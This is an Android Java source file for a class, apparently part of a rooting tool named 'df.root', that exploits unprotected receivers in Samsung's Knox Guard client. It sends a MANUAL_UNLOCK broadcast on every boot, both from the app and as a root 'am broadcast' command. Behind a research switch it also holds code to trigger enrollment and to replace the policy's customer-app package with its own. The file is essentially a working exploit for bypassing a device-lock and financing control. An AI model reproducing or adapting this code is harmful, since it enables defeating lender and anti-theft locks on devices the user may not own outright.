package df.root;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

/**
 * App-domain Knox Guard nudges found in the decompiled kgclient receivers.
 *
 * ServiceIntentReceiver handles MANUAL_UNLOCK without a caller check and
 * emits KNOXGUARD_UNLOCKED. KGKesReceiver handles START_KNOXGUARD and
 * KGIntentReceiver handles CUSTOMER_APP with an attacker-supplied package.
 *
 * Only MANUAL_UNLOCK runs by default. START_KNOXGUARD can open the browser
 * enrollment UI on a device that is not enrolled yet, and CUSTOMER_APP
 * replaces the customer-app slot in the KG policy; both stay disabled unless
 * FULL_NUDGES is flipped for research. START is also skipped while
 * knox.kg.state is Active/Locked/Completed, where x1.a.H() only shows
 * "Device has been enrolled. Can't enroll again."
 *
 * The startup nudge runs once per boot: a per-boot marker in device-protected
 * storage stops a process restart storm from emitting the broadcast again.
 */
final class KgBroadcast {

    private static final String TAG = "dfroot";
    private static final String CLIENT = "com.samsung.android.kgclient";
    private static final String CUSTOMER_PACKAGE = "df.root";
    private static final String BOOT_MARK = "kg-nudge-boot";

    /** Research switch: also send START_KNOXGUARD and CUSTOMER_APP. */
    private static final boolean FULL_NUDGES = false;

    private static final String START = "start";

    private static final String[][] NUDGES = {
            {
                    "unlock",
                    "com.samsung.kgclient.android.intent.action.MANUAL_UNLOCK",
                    ".receiver.ServiceIntentReceiver",
                    null,
            },
            {
                    START,
                    "com.sec.enterprise.knox.cloudmdm.smdms.intent.action.START_KNOXGUARD",
                    ".receiver.KGKesReceiver",
                    null,
            },
            {
                    "customer",
                    "com.samsung.kgclient.intent.action.CUSTOMER_APP",
                    ".receiver.KGIntentReceiver",
                    CUSTOMER_PACKAGE,
            },
    };

    private KgBroadcast() {
    }

    /** Fire the app-domain nudges once per boot, before root exists. */
    static void appOnly(final Context ctx) {
        Thread t = new Thread(() -> {
            if (!KgWatchdog.enabled(ctx) || alreadyNudged(ctx)) {
                return;
            }
            int state = Probes.intProp("knox.kg.state", -1);
            Log.i(TAG, "[kg-broadcast] state=" + state
                    + (enrolled(state) ? " (already enrolled)" : ""));
            for (String[] nudge : NUDGES) {
                if (!enabled(nudge[0], state)) {
                    Log.i(TAG, "[kg-broadcast] " + nudge[0] + " skipped");
                    continue;
                }
                Log.i(TAG, "[kg-broadcast] " + nudge[0]
                        + " app=" + appNudge(ctx, nudge[1], nudge[3]));
            }
            markNudged(ctx);
        }, "dfroot-kg");
        t.setDaemon(true);
        t.start();
    }

    /** Returns lines ready for the run log; never throws. */
    static String apply(Context ctx) {
        if (!KgWatchdog.enabled(ctx)) {
            return "[kg-broadcast] disabled by preference\n";
        }
        int state = Probes.intProp("knox.kg.state", -1);
        StringBuilder out = new StringBuilder();
        out.append("[kg-broadcast] state=").append(state)
                .append(enrolled(state) ? " (already enrolled)" : "").append('\n');
        for (String[] nudge : NUDGES) {
            String label = nudge[0];
            if (!enabled(label, state)) {
                out.append("[kg-broadcast] ").append(label).append(" skipped\n");
                continue;
            }
            String action = nudge[1];
            String receiver = nudge[2];
            String extra = nudge[3];

            String app = appNudge(ctx, action, extra);
            String shell = "am broadcast --user 0 -a " + action
                    + " -p " + CLIENT + " -n " + CLIENT + "/" + receiver;
            if (extra != null) {
                shell += " --es customerPackageName " + extra;
            }
            String root = Runner.suScript(20L, shell);
            out.append("[kg-broadcast] ")
                    .append(label)
                    .append(" app=").append(app)
                    .append(" root=").append(oneLine(root))
                    .append('\n');
        }
        return out.toString();
    }

    private static boolean enabled(String label, int state) {
        if ("unlock".equals(label)) {
            return true;
        }
        if (!FULL_NUDGES) {
            return false;
        }
        if (START.equals(label) && enrolled(state)) {
            return false;
        }
        return true;
    }

    private static String appNudge(Context ctx, String action, String extra) {
        try {
            Intent intent = new Intent(action).setPackage(CLIENT);
            if (extra != null) {
                intent.putExtra("customerPackageName", extra);
            }
            ctx.sendBroadcast(intent);
            return "queued";
        } catch (Throwable t) {
            Log.w(TAG, "kg broadcast " + action + ": " + t);
            return "blocked";
        }
    }

    /** 0=Prenormal, 1=Checking, 2=Active, 3=Locked, 4=Completed, 5=Error. */
    private static boolean enrolled(int state) {
        return state == 2 || state == 3 || state == 4;
    }

    private static boolean alreadyNudged(Context ctx) {
        try {
            File mark = bootMark(ctx);
            if (!mark.isFile()) {
                return false;
            }
            String value = markerValue();
            return !value.isEmpty() && value.equals(readTrim(mark));
        } catch (Throwable t) {
            return false;
        }
    }

    private static void markNudged(Context ctx) {
        try {
            File mark = bootMark(ctx);
            File parent = mark.getParentFile();
            if (parent != null && !parent.isDirectory() && !parent.mkdirs()) {
                return;
            }
            FileOutputStream out = new FileOutputStream(mark, false);
            try {
                out.write(markerValue().getBytes(StandardCharsets.UTF_8));
            } finally {
                out.close();
            }
        } catch (Throwable ignored) {
        }
    }

    private static File bootMark(Context ctx) {
        try {
            return new File(ctx.createDeviceProtectedStorageContext().getFilesDir(), BOOT_MARK);
        } catch (Throwable t) {
            return new File(ctx.getFilesDir(), BOOT_MARK);
        }
    }

    /** Empty when unreadable: then the nudge is not throttled. */
    private static String markerValue() {
        return BootId.current();
    }

    private static String readTrim(File file) {
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                new FileInputStream(file), StandardCharsets.UTF_8))) {
            String line = reader.readLine();
            return line == null ? "" : line.trim();
        } catch (Throwable t) {
            return "";
        }
    }

    private static String oneLine(String value) {
        if (value == null || value.trim().isEmpty()) {
            return "no-reply";
        }
        String flat = value.trim().replace('\n', ' ');
        return flat.length() > 140 ? flat.substring(0, 140) + "..." : flat;
    }
}
